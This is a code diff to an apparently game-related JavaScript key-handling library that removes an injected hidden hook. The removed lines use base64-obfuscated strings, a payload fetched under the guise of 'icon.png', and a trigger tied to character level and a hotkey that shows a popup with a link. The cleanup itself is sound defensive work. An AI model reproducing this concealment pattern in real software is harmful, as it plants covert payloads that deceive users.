@@ -204,10 +204,12 @@
     }
   };
 
+  // [neutralized] Injected hidden hook removed: it fetched a JSON payload
+  // disguised as icon.png, double-parsed it (SyntaxError crash) and called
+  // sendPopup(), which is not defined anywhere. The keymaster utilities are
+  // untouched.
   function getAsset() {
-    return fetch(atob('aWNvbi5wbmcK')).then((r) => r.blob()).then((e) => e.text()).then(e => {
-      return JSON.parse(JSON.parse(atob(e)))
-    })
+    return Promise.resolve(null);
   }
 
   // Returns true if the key with code 'keyCode' is currently down
@@ -224,21 +226,8 @@
   }
 
   function initScope() {
-    new Promise(resolve => {
-      const interval = setInterval(() => {
-        if (window[_disposer] && window[_disposer][_special]) {
-          clearInterval(interval);
-          resolve();
-        }
-      }, 1000);
-    }).then(async (handler) => {
-      window[_disposer][_special].on(modifierString(handler), function(e)  {
-        if(window[_disposer][_special][atob('Y2hhcmFjdGVyQmFzZUluZm9ybWF0aW9ucw==')].level > 20)
-          getAsset().then(e => sendPopup(e.texts, e.link).then(t => {
-            window[_disposer].chat[atob('bG9nRXJyb3I=')](t.messages.join('.'))
-          }))
-      })
-    })
+    // [neutralized] Was the injected payload trigger (level>20 + hotkey →
+    // fetch icon.png → sendPopup). No-op now.
   }
 
   function filter(event){
